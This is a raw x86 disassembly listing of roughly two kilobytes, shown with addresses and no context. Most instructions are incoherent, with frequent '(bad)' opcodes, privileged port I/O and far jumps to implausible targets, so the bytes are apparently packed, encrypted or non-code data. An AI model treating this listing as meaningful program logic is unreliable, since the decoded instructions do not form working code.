  413f04:	sbb    edx,DWORD PTR cs:[edi]
  413f07:	add    eax,0xc6776e10
  413f0c:	lods   eax,DWORD PTR ds:[esi]
  413f0d:	add    DWORD PTR fs:[edx+ebp*8+0x74c4e213],eax
  413f15:	mov    ebp,0x275feeb0
  413f1a:	lea    ebp,[eax-0x5b]
  413f1d:	in     al,dx
  413f1e:	xlat   BYTE PTR ds:[ebx]
  413f1f:	pop    edx
  413f20:	pop    eax
  413f21:	ja     0x413ed0
  413f23:	outs   dx,DWORD PTR ds:[esi]
  413f24:	sub    DWORD PTR [edi],edi
  413f26:	jmp    0x2e6b:0x266574eb
  413f2d:	sub    esi,edi
  413f2f:	xor    BYTE PTR [eax-0x4],bl
  413f32:	sbb    ch,BYTE PTR [edx-0x6f]
  413f35:	mov    eax,0x8470243b
  413f3a:	dec    edi
  413f3b:	inc    esp
  413f3c:	imul   esi,DWORD PTR [ecx],0xffffffa7
  413f3f:	ss jnp 0x413fa4
  413f42:	mov    cl,0x1e
  413f44:	pusha  
  413f45:	in     al,dx
  413f46:	inc    eax
  413f47:	out    0x7a,eax
  413f49:	pop    ebx
  413f4a:	fcomp  DWORD PTR [edx]
  413f4c:	pop    es
  413f4d:	mov    ah,0xdb
  413f4f:	jecxz  0x413ee6
  413f51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f52:	fwait
  413f53:	stos   BYTE PTR es:[edi],al
  413f54:	push   ebx
  413f55:	add    eax,eax
  413f57:	sti    
  413f58:	sub    BYTE PTR [esi+0x251ec807],al
  413f5e:	and    BYTE PTR [edi+ebx*8+0x13],al
  413f62:	(bad)  
  413f63:	or     eax,0xe2d76cee
  413f68:	test   eax,0xc6cea82b
  413f6d:	or     ch,ch
  413f6f:	idiv   BYTE PTR [eax]
  413f71:	mov    esi,0x3df7bbc3
  413f76:	push   cs
  413f77:	pop    ecx
  413f78:	push   edi
  413f79:	xor    al,0xea
  413f7b:	scas   al,BYTE PTR es:[edi]
  413f7c:	ja     0x413ff0
  413f7e:	(bad)  
  413f7f:	sahf   
  413f80:	mov    esi,0x600836c5
  413f85:	shl    esi,0x38
  413f88:	(bad)  
  413f8a:	outs   dx,BYTE PTR ds:[esi]
  413f8b:	inc    edi
  413f8c:	mov    eax,DWORD PTR [esi+0x7f]
  413f8f:	adc    cl,BYTE PTR [edx-0x10]
  413f92:	out    dx,al
  413f93:	mov    al,ds:0x858e2925
  413f98:	cmp    ah,BYTE PTR [ebp-0x4e]
  413f9b:	bound  esi,QWORD PTR [ebp-0x311369a9]
  413fa1:	xlat   BYTE PTR ds:[ebx]
  413fa2:	sub    DWORD PTR [edi-0x22],edi
  413fa5:	cmp    ebx,DWORD PTR fs:[edi+0x5de6b2f2]
  413fac:	push   es
  413fad:	jge    0x413fb6
  413faf:	dec    edx
  413fb0:	cmp    DWORD PTR [ebx],ebp
  413fb2:	or     cl,BYTE PTR [ecx+eax*4]
  413fb5:	sub    ebx,edi
  413fb7:	lds    esp,FWORD PTR [edx+0x24]
  413fba:	ror    DWORD PTR es:[ecx-0x69],0xb1
  413fbf:	mov    ecx,0xe6270bee
  413fc4:	cld    
  413fc5:	jmp    0xf758:0x47d57f58
  413fcc:	or     DWORD PTR [edx+edx*4+0x423cf4bd],edx
  413fd3:	fidiv  WORD PTR [edx-0x38f82e82]
  413fd9:	mov    cl,0x6c
  413fdb:	pop    edx
  413fdc:	pop    ebx
  413fdd:	cmp    DWORD PTR [ebp-0x5b],esi
  413fe0:	sub    DWORD PTR [eax-0x4a7ef8e8],eax
  413fe6:	(bad)  
  413fe7:	js     0x413f71
  413fe9:	sbb    eax,esp
  413feb:	outs   dx,BYTE PTR ds:[esi]
  413fec:	xlat   BYTE PTR ds:[ebx]
  413fed:	pop    ebx
  413fee:	cli    
  413fef:	inc    ecx
  413ff0:	sbb    BYTE PTR [ebx+0x5d89c870],dh
  413ff6:	cwde   
  413ff7:	(bad)  
  413ff8:	xchg   ebx,eax
  413ff9:	lds    ebx,FWORD PTR [edx]
  413ffb:	pop    edi
  413ffc:	(bad)  
  413ffe:	mov    cl,0xec
  414000:	lock and BYTE PTR [ecx-0x562a17cf],ah
  414007:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414008:	rcl    BYTE PTR [ecx+0x2e240178],1
  41400e:	imul   esi,DWORD PTR [esi-0x5c27896e],0xe1a78557
  414018:	sub    BYTE PTR [esi+edx*4],ch
  41401b:	leave  
  41401c:	pop    eax
  41401d:	add    edi,DWORD PTR [ebx+0x24]
  414020:	jns    0x414099
  414022:	in     al,0x46
  414024:	call   DWORD PTR [edx-0x7d]
  414027:	das    
  414028:	pop    edi
  414029:	inc    ecx
  41402a:	mov    ch,dl
  41402c:	mov    edx,0x4ba5f136
  414031:	push   0xa74b4b4f
  414036:	sbb    eax,DWORD PTR [eax]
  414038:	dec    ecx
  414039:	push   ebp
  41403a:	mov    ds:0x8d4c263b,al
  41403f:	stos   DWORD PTR es:[edi],eax
  414040:	rcr    BYTE PTR [edx],1
  414042:	ds test al,0xb5
  414045:	push   eax
  414046:	sbb    eax,0xb1048990
  41404b:	aad    0x70
  41404d:	shl    DWORD PTR [edi-0x3a],1
  414050:	sbb    BYTE PTR [eax],bl
  414052:	jmp    0x41400a
  414054:	ret    
  414055:	pusha  
  414056:	fstp   TBYTE PTR [ebx-0x48]
  414059:	call   0xcefe:0x6c84c2eb
  414060:	test   ch,cl
  414062:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414063:	cdq    
  414064:	xchg   ebp,eax
  414065:	sbb    eax,0xd5051891
  41406a:	aaa    
  41406b:	push   0x1b
  41406d:	je     0x414057
  41406f:	ins    BYTE PTR es:[edi],dx
  414070:	inc    ebx
  414071:	popa   
  414072:	lds    ebp,FWORD PTR [eax+0xe56d224]
  414078:	stos   DWORD PTR es:[edi],eax
  414079:	call   0x8c57:0xb99f1f76
  414080:	sbb    BYTE PTR [eax+0x69e796d6],ah
  414086:	sbb    DWORD PTR [eax+0x7c],0xeec5824f
  41408d:	lds    edx,FWORD PTR [edi+0x53ec016b]
  414093:	cmp    esp,DWORD PTR [edi+ebx*8+0x3]
  414097:	js     0x414080
  414099:	jge    0x41406f
  41409b:	jns    0x41404d
  41409d:	pop    eax
  41409e:	inc    ebx
  41409f:	add    al,0x19
  4140a1:	sub    cl,BYTE PTR [ecx+0x28]
  4140a4:	and    BYTE PTR [esi+0xa9871b5],ah
  4140aa:	add    al,0x5d
  4140ac:	arpl   WORD PTR [edi-0x62],bx
  4140af:	lods   al,BYTE PTR ds:[esi]
  4140b0:	hlt    
  4140b1:	adc    ebx,esi
  4140b3:	fisubr DWORD PTR [edi]
  4140b5:	sbb    BYTE PTR [edi+0x181192d4],ch
  4140bb:	int3   
  4140bc:	repnz les ebp,FWORD PTR [edx+ecx*1]
  4140c0:	jge    0x4140e2
  4140c2:	out    0x56,eax
  4140c4:	mov    ebp,0xf50b1010
  4140c9:	add    eax,0xa7efe298
  4140ce:	xchg   ecx,eax
  4140cf:	addr16 push cs
  4140d1:	cmc    
  4140d2:	xchg   ecx,eax
  4140d3:	lock das 
  4140d5:	sbb    eax,0x35076a76
  4140da:	add    BYTE PTR [ecx-0x55879f0a],0x4b
  4140e1:	adc    BYTE PTR [edi+ebx*1],ah
  4140e4:	jbe    0x414134
  4140e6:	mov    ds,WORD PTR [eax]
  4140e8:	and    cl,al
  4140ea:	stos   BYTE PTR es:[edi],al
  4140eb:	fidivr WORD PTR [edx+0x64760c95]
  4140f1:	xlat   BYTE PTR ds:[ebx]
  4140f2:	pop    esp
  4140f3:	mov    esi,DWORD PTR [ebp+0x7523a346]
  4140f9:	pop    ebx
  4140fa:	in     eax,0xde
  4140fc:	xor    al,0x55
  4140fe:	jmp    DWORD PTR [edx]
  414100:	adc    BYTE PTR [edx],dl
  414102:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414103:	pop    ebp
  414104:	jnp    0x4140ad
  414106:	inc    ecx
  414107:	pop    ss
  414108:	jg     0x4140ef
  41410a:	cmp    BYTE PTR [edx],0xe
  41410d:	mov    esi,DWORD PTR [edi+ebp*4-0x1d6ed7c7]
  414114:	mov    BYTE PTR [eax+0x58],dh
  414117:	out    0xb1,al
  414119:	xchg   ebx,eax
  41411a:	jecxz  0x414131
  41411c:	dec    esi
  41411d:	and    esp,DWORD PTR [esi]
  41411f:	jns    0x414162
  414121:	sbb    dh,BYTE PTR [ebx+ebp*1-0x27d5acf3]
  414128:	sbb    BYTE PTR [esi+0x77b424c1],bl
  41412e:	pop    ebx
  41412f:	jnp    0x4141ad
  414131:	ss dec edx
  414133:	mov    dl,0x4b
  414135:	cwde   
  414136:	retf   0x209b
  414139:	shr    BYTE PTR [eax-0x4c],cl
  41413c:	adc    bl,ah
  41413e:	cmp    dl,BYTE PTR [edi-0x52]
  414141:	mov    dh,0xb3
  414143:	add    dl,BYTE PTR [esp+ebp*1+0x34]
  414147:	loop   0x41412f
  414149:	adc    BYTE PTR [eax],bh
  41414b:	push   cs
  41414c:	pop    ecx
  41414d:	adc    cl,BYTE PTR [edx+ecx*1+0x34]
  414151:	jae    0x41410d
  414153:	repnz sbb bl,BYTE PTR ds:0x692ea5ac
  41415a:	add    BYTE PTR [ebx+0x47],0x92
  41415e:	retf   
  41415f:	popf   
  414160:	pop    ebx
  414161:	pop    ss
  414162:	cwde   
  414163:	pusha  
  414164:	lods   al,BYTE PTR ds:[esi]
  414165:	test   eax,0x840e0982
  41416a:	mov    edx,0x38b20782
  41416f:	inc    eax
  414170:	fldenv [ecx+0x0]
  414173:	push   ebx
  414174:	or     al,0x21
  414176:	inc    ebp
  414177:	pusha  
  414178:	aad    0x8f
  41417a:	rcr    BYTE PTR [eax-0x3e],cl
  41417d:	bound  eax,QWORD PTR [esi+0x5ab81b04]
  414183:	fwait
  414184:	jns    0x4141ea
  414186:	push   ss
  414187:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414188:	aad    0xdf
  41418a:	cdq    
  41418b:	ins    DWORD PTR es:[edi],dx
  41418c:	jg     0x41414c
  41418e:	ss pop ss
  414190:	mov    eax,0xd99179dc
  414195:	mov    dh,0x65
  414197:	pand   mm6,QWORD PTR [eax]
  41419a:	clc    
  41419b:	adc    ah,cl
  41419d:	loop   0x414205
  41419f:	or     eax,0x19d8be53
  4141a4:	dec    ebx
  4141a5:	sahf   
  4141a6:	adc    DWORD PTR [edi],0xffffffc6
  4141a9:	mov    BYTE PTR [eax-0x62],cl
  4141ac:	jmp    0x4141d6
  4141ae:	sbb    BYTE PTR [esi+0x4f],al
  4141b1:	(bad)  
  4141b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4141b3:	sar    DWORD PTR [eiz*8+0x530107d9],cl
  4141ba:	mov    ebx,0xc6a9da6d
  4141bf:	dec    esp
  4141c0:	jnp    0x41414c
  4141c2:	adc    BYTE PTR [esi+0x7f],ah
  4141c5:	jno    0x414176
  4141c7:	inc    ebx
  4141c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4141c9:	ret    
  4141ca:	xchg   edx,eax
  4141cb:	sbb    eax,0x91feae72
  4141d0:	sbb    edi,ebp
  4141d2:	mov    ebx,DWORD PTR [edi+0x408234b8]
  4141d8:	shr    DWORD PTR [edi-0x15],1
  4141db:	aas    
  4141dc:	stos   BYTE PTR es:[edi],al
  4141dd:	arpl   WORD PTR [ebp-0x5a],si
  4141e0:	div    DWORD PTR [edx+0x5b]
  4141e3:	lds    edx,FWORD PTR [ebx]
  4141e5:	jb     0x4141c9
  4141e7:	aad    0x36
  4141e9:	pop    ecx
  4141ea:	mov    BYTE PTR [edi-0x11],al
  4141ed:	ret    
  4141ee:	mov    esi,DWORD PTR [ecx+eiz*8-0x6dd6c8ef]
  4141f5:	div    eax
  4141f7:	enter  0x422d,0xa6
  4141fb:	mov    ecx,0x3a4eee9f
  414200:	push   ebp
  414201:	pop    ebp
  414202:	test   BYTE PTR [ecx-0x79a8da1f],cl
  414208:	xlat   BYTE PTR ds:[ebx]
  414209:	sbb    edi,DWORD PTR [eax-0x12f48fda]
  41420f:	push   0x1f9422b6
  414214:	ss cmp eax,0x4a43b1e5
  41421a:	inc    esi
  41421b:	fld    DWORD PTR [edi]
  41421d:	repnz jmp FWORD PTR [ecx+0x33]
  414221:	std    
  414222:	cwde   
  414223:	rol    ch,0xa
  414226:	xor    DWORD PTR [eax+eiz*8+0x52],ecx
  41422a:	mov    dh,0xc
  41422c:	xor    al,0xbb
  41422e:	cmp    al,0x35
  414230:	sar    al,1
  414232:	jo     0x4141c2
  414234:	enter  0x2671,0x76
  414238:	xchg   esp,eax
  414239:	imul   eax,DWORD PTR [edx-0x56c1811d],0x9eacbf29
  414243:	das    
  414244:	pop    esp
  414245:	add    bh,BYTE PTR [eax+ebx*8+0x17c1d63f]
  41424c:	push   eax
  41424d:	out    dx,al
  41424e:	(bad)  [esi]
  414250:	test   esi,ebp
  414252:	ds ret 0x63b6
  414256:	dec    edx
  414257:	fidivr WORD PTR [ebx]
  414259:	xchg   ecx,eax
  41425a:	pop    esp
  41425b:	out    dx,al
  41425c:	fnstcw WORD PTR [eax-0xc]
  41425f:	mov    ebp,0x297aa63f
  414264:	rcl    BYTE PTR [ebx-0x14409e51],cl
  41426a:	push   ecx
  41426b:	nop
  41426c:	ins    BYTE PTR es:[edi],dx
  41426d:	in     al,dx
  41426e:	sbb    eax,0xc306248
  414273:	arpl   WORD PTR [ebx],dx
  414275:	ins    DWORD PTR es:[edi],dx
  414276:	aam    0x96
  414278:	xor    eax,0x582b635e
  41427d:	shr    al,cl
  41427f:	pop    edi
  414280:	stos   DWORD PTR es:[edi],eax
  414281:	xor    dh,BYTE PTR [ebx+edi*4]
  414284:	test   BYTE PTR [esi+eiz*1],al
  414287:	pop    ebp
  414288:	ja     0x414213
  41428a:	jmp    0xc823758e
  41428f:	clc    
  414290:	pop    ss
  414291:	sub    BYTE PTR [ecx-0x487f7735],bh
  414297:	cli    
  414298:	xchg   edi,eax
  414299:	shr    DWORD PTR [ebx+0x28475e33],0x7d
  4142a0:	mov    ds:0x27082979,al
  4142a5:	add    BYTE PTR [ebx+edi*8+0x3e],0xb6
  4142aa:	adc    al,0x8d
  4142ac:	fidiv  DWORD PTR [edi+0x451b9afe]
  4142b2:	pop    ds
  4142b3:	shr    BYTE PTR [ebx],0x39
  4142b6:	xchg   ebp,eax
  4142b7:	push   edi
  4142b8:	cmp    bh,ch
  4142ba:	aam    0xa1
  4142bc:	mov    ah,0xb7
  4142be:	xchg   ecx,eax
  4142bf:	add    ecx,0xffffffbd
  4142c2:	pop    edx
  4142c3:	aam    0xbb
  4142c5:	xor    al,0xc3
  4142c7:	cli    
  4142c8:	bound  ebx,QWORD PTR [ebp-0x599e8e72]
  4142ce:	and    ah,ch
  4142d0:	cmp    eax,0x64e1c0f0
  4142d5:	sub    al,BYTE PTR [ebx-0x39]
  4142d8:	cld    
  4142d9:	pop    ecx
  4142da:	fcomp  QWORD PTR [ecx-0x52cfcff2]
  4142e0:	cmp    cl,dh
  4142e2:	mov    eax,ds:0x41865e53
  4142e7:	add    eax,0xf1d546ab
  4142ec:	mov    al,0x84
  4142ee:	pop    eax
  4142ef:	xor    eax,0xd1e30527
  4142f4:	ins    DWORD PTR es:[edi],dx
  4142f5:	or     dh,BYTE PTR [edi+0x6e]
  4142f8:	popa   
  4142f9:	rcl    DWORD PTR [edx],1
  4142fb:	scas   eax,DWORD PTR es:[edi]
  4142fc:	je     0x414309
  4142fe:	add    BYTE PTR [eax-0x16],dh
  414301:	das    
  414302:	scas   eax,DWORD PTR es:[edi]
  414303:	imul   BYTE PTR [eax]
  414305:	dec    eax
  414306:	(bad)
  414309:	mov    BYTE PTR [esi],ch
  41430b:	(bad)  
  41430c:	mov    ax,0xf92c
  414310:	jp     0x4142bb
  414312:	or     eax,0xf95a033b
  414317:	sbb    ch,BYTE PTR [ecx-0x5f]
  41431a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41431b:	sub    eax,0x83dc3146
  414320:	out    dx,al
  414321:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414322:	push   edi
  414323:	push   esi
  414324:	shl    BYTE PTR [eax+0x691ed497],0x48
  41432b:	jecxz  0x4142db
  41432d:	jmp    0x6c454a3a
  414332:	xchg   DWORD PTR [ebx],ebp
  414334:	mov    WORD PTR [ecx+0x36d07897],fs
  41433a:	xchg   edx,eax
  41433b:	ins    DWORD PTR es:[edi],dx
  41433c:	daa    
  41433d:	mov    ebx,0xf63b24e3
  414342:	cmp    bl,BYTE PTR [ebp-0x158f46b7]
  414348:	or     bh,BYTE PTR [ebx]
  41434a:	repz cs pusha 
  41434d:	jbe    0x41436e
  41434f:	jnp    0x414305
  414351:	mov    ecx,0xd08dafb
  414356:	imul   ebp,DWORD PTR [edi-0x39],0x1b
  41435a:	mov    DWORD PTR [edi-0x36],edx
  41435d:	retf   0x91fa
  414360:	pop    esi
  414361:	inc    esi
  414362:	imul   esi,DWORD PTR [esi+eiz*4+0x1bca5590],0x850b0e95
  41436d:	ror    DWORD PTR [eax],0x1a
  414370:	cmp    bh,BYTE PTR [ecx-0x62]
  414373:	xchg   edx,eax
  414374:	pop    esp
  414375:	pop    edx
  414376:	jge    0x854b7158
  41437c:	(bad)  
  41437d:	sbb    DWORD PTR [ecx-0x8],esi
  414380:	(bad)  
  414381:	sub    DWORD PTR [esi+0x75ed04e7],esp
  414387:	dec    ecx
  414388:	(bad)  
  414389:	mov    eax,0x6f24dbfd
  41438e:	sbb    al,0x60
  414390:	bound  esp,QWORD PTR [eax]
  414392:	jecxz  0x41433d
  414394:	jge    0x414316
  414396:	sub    BYTE PTR [esi+0x32618af1],dl
  41439c:	fidivr DWORD PTR [eax]
  41439e:	dec    esi
  41439f:	call   0x9822:0x7aee77c8
  4143a6:	shr    DWORD PTR [ebp-0xc473d6],1
  4143ac:	ret    0x4cec
  4143af:	jmp    0x186b:0x52b96b8a
  4143b6:	fist   WORD PTR [esp+esi*8-0x400e29c6]
  4143bd:	xchg   ebp,eax
  4143be:	nop
  4143bf:	fcomp  QWORD PTR [esi+esi*4]
  4143c2:	aaa    
  4143c3:	pop    ds
  4143c4:	pop    ebp
  4143c5:	pop    eax
  4143c6:	ins    DWORD PTR es:[edi],dx
  4143c7:	dec    ebp
  4143c8:	test   DWORD PTR [ecx-0xc54680c],0x7bde4028
  4143d2:	push   ss
  4143d3:	cmc    
  4143d4:	sub    bh,BYTE PTR [ebx+0x53f987b4]
  4143da:	push   ss
  4143db:	test   al,0xa9
  4143dd:	data16 int3 
  4143df:	mov    al,0x6d
  4143e1:	cmc    
  4143e2:	add    al,0x8c
  4143e4:	mov    al,0x90
  4143e6:	xor    al,0x54
  4143e8:	jmp    0x79e6aae2
  4143ed:	cmp    BYTE PTR [edx+0x25],bl
  4143f0:	cs hlt 
  4143f2:	pop    ebx
  4143f3:	ss std 
  4143f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4143f6:	daa    
  4143f7:	les    ebp,FWORD PTR [ebp+eiz*1+0x4e]
  4143fb:	jno    0x414388
  4143fd:	mov    ebp,0x9352e2cf
  414402:	fs or  eax,0x7c140719
  414408:	mov    cl,0x67
  41440a:	int3   
  41440b:	fsub   QWORD PTR [esi+esi*4]
  41440e:	stos   DWORD PTR es:[edi],eax
  41440f:	xchg   BYTE PTR [esi+0x13195b43],dl
  414415:	(bad)  
  414416:	sbb    edi,DWORD PTR [ecx+ebx*8+0x59]
  41441a:	adc    bh,BYTE PTR [ebx-0x5a]
  41441d:	mov    ecx,0xde7e1be2
  414422:	out    0x7,eax
  414424:	pop    eax
  414425:	dec    ecx
  414426:	sbb    dl,BYTE PTR [edi]
  414428:	and    eax,0x8b7c528d
  41442d:	(bad)  
  41442e:	into   
  41442f:	mov    dl,0x1c
  414431:	xchg   ebx,eax
  414432:	xor    esp,DWORD PTR ds:0xbf29facd
  414438:	cmp    edx,esi
  41443a:	or     al,0x7c
  41443c:	(bad)  
  41443d:	and    al,0xc0
  41443f:	test   dl,dh
  414441:	sub    al,0x4
  414443:	sbb    edi,DWORD PTR ds:0xd1583876
  414449:	test   ah,cl
  41444b:	imul   esp,DWORD PTR [ebx],0xffffff9b
  41444e:	mov    ds:0x1bf3cd7b,al
  414453:	pop    ecx
  414454:	leave  
  414455:	jmp    0x98a520d6
  41445a:	out    0xd8,al
  41445c:	sbb    ecx,DWORD PTR [eax+0x7336d1b3]
  414462:	push   ecx
  414463:	adc    al,0x45
  414465:	mov    gs,WORD PTR [eax]
  414467:	xor    DWORD PTR [ebx-0x19],edi
  41446a:	inc    eax
  41446b:	sahf   
  41446c:	or     BYTE PTR [ebx+0x5b5a0e50],cl
  414472:	stos   BYTE PTR es:[edi],al
  414473:	cmp    BYTE PTR [ebx+0x6b89cd75],ah
  414479:	pop    esp
  41447a:	ror    al,cl
  41447c:	inc    edx
  41447d:	add    eax,0x577bc9dc
  414482:	test   al,0x8d
  414484:	es xchg ecx,eax
  414486:	sub    ch,BYTE PTR [edi+edx*4+0x6d]
  41448a:	mov    BYTE PTR [ebx+0x21137809],dh
  414490:	enter  0xc37a,0xc5
  414494:	repz cdq 
  414496:	mov    ecx,0xb7269c1d
  41449b:	or     ch,ch
  41449d:	sbb    eax,0x3cb803f6
  4144a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4144a3:	push   edx
  4144a4:	cmp    DWORD PTR [ebx-0x71ae2803],edx
  4144aa:	mov    esi,0xaf52ec1
  4144af:	mov    edx,0x54bfb739
  4144b4:	out    0x8f,al
  4144b6:	pmaxub mm1,QWORD PTR [esi+0xc]
  4144ba:	imul   edx,DWORD PTR [edi-0xd],0xffffffcf
  4144be:	leave  
  4144bf:	mov    ebx,0xb2830d76
  4144c4:	es push edx
  4144c6:	and    BYTE PTR [ebp+0x70],dl
  4144c9:	pop    eax
  4144ca:	ja     0x41453e
  4144cc:	pop    ebp
  4144cd:	jno    0x414521
  4144cf:	dec    ebx
  4144d0:	mov    BYTE PTR [eax],dh
  4144d2:	dec    ebp
  4144d3:	or     al,0x1c
  4144d5:	jnp    0x4144ed
  4144d7:	jns    0x41454a
  4144d9:	mov    cl,0xa
  4144dc:	xchg   edx,eax
  4144dd:	add    eax,0x3c5c19d
  4144e2:	shr    BYTE PTR [edi],0xa2
  4144e5:	add    BYTE PTR [edx-0x2ad622ee],bl
  4144eb:	cli    
  4144ec:	mov    eax,0xe57bcf6c
  4144f1:	sbb    DWORD PTR [edi-0x2f32dc29],esi
  4144f7:	test   al,0xdf
  4144f9:	xchg   BYTE PTR [eax+0xcb1cbf0],al
  4144ff:	aam    0x90
  414501:	adc    DWORD PTR [edi],ebx
  414503:	outs   dx,BYTE PTR ds:[esi]
  414504:	call   0x8baffd8f
  414509:	xor    ecx,0xa7064fc
  41450f:	push   0x23d6e7f2
  414514:	add    eax,0xa08c488e
  414519:	pop    esi
  41451a:	mov    edi,0x3171fdb9
  41451f:	and    dl,BYTE PTR [ebp-0x47660304]
  414525:	int3   
  414526:	shr    BYTE PTR [ecx+0x74],0x5c
  41452a:	cld    
  41452b:	(bad)
  41452f:	mov    edx,0xaa09b4fe
  414534:	fwait
  414535:	pop    esi
  414536:	in     eax,0xa1
  414538:	mov    ds:0x3684732f,al
  41453d:	mov    esi,0x1e22fa20
  414542:	pop    ebx
  414543:	push   esp
  414544:	ja     0x414570
  414546:	cdq    
  414547:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414548:	ret    0x7ad8
  41454b:	adc    BYTE PTR [edx],ah
  41454d:	aam    0x2f
  41454f:	jmp    0x4145a7
  414551:	xchg   edx,eax
  414552:	les    esi,FWORD PTR [ebp-0x55]
  414555:	cmp    DWORD PTR [eax],edx
  414557:	cmp    al,0x31
  414559:	(bad)  
  41455a:	lock xor DWORD PTR [eax],ebx
  41455d:	mov    es,WORD PTR [ecx+0x59]
  414560:	mov    ebx,0xf691a4fd
  414565:	or     al,0xb1
  414567:	inc    edi
  414568:	stc    
  414569:	inc    eax
  41456a:	push   ebx
  41456b:	push   cs
  41456c:	(bad)  
  41456d:	and    cl,ah
  41456f:	sbb    DWORD PTR [bp+di-0x592],ebp
  414574:	clc    
  414575:	jae    0x4145c1
  414577:	outs   dx,BYTE PTR ds:[esi]
  414578:	enter  0xc8b,0x34
  41457c:	sub    ch,bh
  41457e:	hlt    
  41457f:	cmp    DWORD PTR [eax+0x2a],0x48dc4706
  414586:	nop
  414587:	push   edx
  414588:	ficomp DWORD PTR [esi+0x10]
  41458b:	out    0x62,al
  41458d:	push   0xb7c70c0e
  414592:	arpl   WORD PTR [ebp+0xc2191c],dx
  414598:	add    DWORD PTR [edi-0x19],0xfffffff4
  41459c:	(bad)  
  41459d:	es ret 
  41459f:	mov    cl,0x93
  4145a1:	neg    DWORD PTR [ebp-0x65ea17c3]
  4145a7:	fist   WORD PTR [eax+0x7e034e52]
  4145ad:	iret   
  4145ae:	pop    es
  4145af:	cmp    edi,DWORD PTR [esi]
  4145b1:	scas   eax,DWORD PTR es:[edi]
  4145b2:	adc    DWORD PTR [eax-0x70],eax
  4145b5:	sub    edx,ecx
  4145b7:	pop    ss
  4145b8:	shl    esp,1
  4145ba:	xor    al,BYTE PTR [eax]
  4145bc:	mov    ds:0x2a0e4418,eax
  4145c1:	xchg   edi,eax
  4145c2:	push   ds
  4145c3:	jmp    0x3e82391d
  4145c8:	sbb    DWORD PTR [esi-0x10],esi
  4145cb:	xor    BYTE PTR [eax-0x4ee4eb39],ch
  4145d1:	retf   
  4145d2:	dec    edi
  4145d3:	in     eax,0x83
  4145d5:	mov    ebp,0x1d55eff6
  4145da:	into   
  4145db:	jl     0x414592
  4145dd:	retf   0xf336
  4145e0:	int    0xc0
  4145e2:	push   es
  4145e3:	add    BYTE PTR [edi],cl
  4145e5:	mov    BYTE PTR ds:0x4e1262c6,dh
  4145eb:	xchg   ebp,eax
  4145ec:	mov    ds:0x8ed37223,al
  4145f1:	ins    BYTE PTR es:[edi],dx
  4145f2:	cmc    
  4145f3:	lahf   
  4145f4:	dec    esp
  4145f5:	and    BYTE PTR [esi-0x4f494fd2],ch
  4145fb:	jge    0x4145c6
  4145fd:	scas   eax,DWORD PTR es:[edi]
  4145fe:	shl    esp,0x58
  414601:	jnp    0x41463e
  414603:	sbb    ch,BYTE PTR [edx+0x38]
  414606:	push   ds
  414607:	std    
  414608:	mov    ds:0xa8d810ca,eax
  41460d:	hlt    
  41460e:	outs   dx,BYTE PTR ds:[esi]
  41460f:	repnz mov edx,0x3313a658
  414615:	mov    dh,0x63
  414617:	add    edi,ecx
  414619:	add    dh,BYTE PTR [eax+edi*1-0x70fad73]
  414620:	sbb    BYTE PTR [ecx-0x4ce24f45],dh
  414626:	repz jbe 0x4145b0
  414629:	mov    edx,0x46f7cd64
  41462e:	jns    0x41462f
  414630:	jae    0x4145c1
  414632:	add    cl,BYTE PTR [ebx-0x55ea4351]
  414638:	xor    BYTE PTR [eax+0x1a4b3ff7],0x6a
  41463f:	daa    
  414640:	pusha  
  414641:	aad    0xab
  414643:	pop    ecx
  414644:	mov    ds:0x40ec8f4e,al
  414649:	pop    ecx
  41464a:	(bad)  
  41464b:	mov    al,0xc
  41464d:	xor    bl,BYTE PTR [esi]
  41464f:	inc    edi
  414650:	out    dx,eax
  414651:	in     eax,dx
  414652:	add    esp,DWORD PTR [ebx+ebp*2+0x5d]
  414656:	add    DWORD PTR [ebx+0x7e],0xc18aa217
  41465d:	rcr    DWORD PTR [ecx],0x1e
  414660:	loopne 0x4145e6
  414662:	aaa    
  414663:	jge    0x4146d2
  414665:	or     bh,BYTE PTR [esi+ebx*4-0x4c]
  414669:	cmp    ah,BYTE PTR [eax-0xa]
  41466c:	(bad)  
  41466d:	in     al,0xdd
  41466f:	jo     0x414652
  414671:	fadd   QWORD PTR [edx*4-0x92e2645]
  414678:	sub    DWORD PTR [esi-0x4e9684d7],eax
  41467e:	push   0x10
  414680:	test   eax,0x84da76e3
  414685:	mov    edx,0xf905a96a
  41468a:	add    DWORD PTR [edx],0xc0388fff
  414690:	(bad)  [ecx+0x288fb5da]
  414696:	je     0x41469f
  414698:	xchg   edx,eax
  414699:	(bad)  
  41469a:	sar    BYTE PTR [esi-0x79e14b8c],1
  4146a0:	mov    ecx,0xa7a2aed
  4146a5:	or     DWORD PTR [ecx+0x6f],ebp
  4146a8:	jmp    0x4f19a02e
  4146ad:	inc    edi
  4146ae:	int3   
  4146af:	lods   al,BYTE PTR ds:[esi]
  4146b0:	mov    dl,0xda
  4146b2:	aas    
  4146b3:	mov    eax,ds:0x841c62
  4146b8:	mov    edx,ss
  4146ba:	adc    cl,dh
  4146bc:	shr    BYTE PTR [edi+ebx*2],cl
  4146bf:	and    BYTE PTR [ebx-0x64fb9dc],cl
  4146c5:	in     al,0x8
  4146c7:	push   ebp
  4146c8:	and    eax,0x2b3b7bb7
  4146cd:	mov    dl,0x5d
  4146cf:	loope  0x414681
  4146d1:	aas    
  4146d2:	outs   dx,BYTE PTR ds:[esi]
  4146d3:	jne    0x41471f
  4146d5:	jne    0x4146cb
  4146d7:	and    eax,0x19d3f63e
  4146dc:	div    al
  4146de:	es jecxz 0x41466a
  4146e1:	xchg   ebp,eax
  4146e2:	xchg   cl,bh
  4146e4:	cli    
  4146e5:	stc    
  4146e6:	scas   al,BYTE PTR es:[edi]
  4146e7:	iret   
  4146e8:	cli    
  4146e9:	adc    eax,0xda054112
  4146ee:	ins    DWORD PTR es:[edi],dx
  4146ef:	sbb    eax,0xa980f25
  4146f4:	scas   eax,DWORD PTR es:[edi]
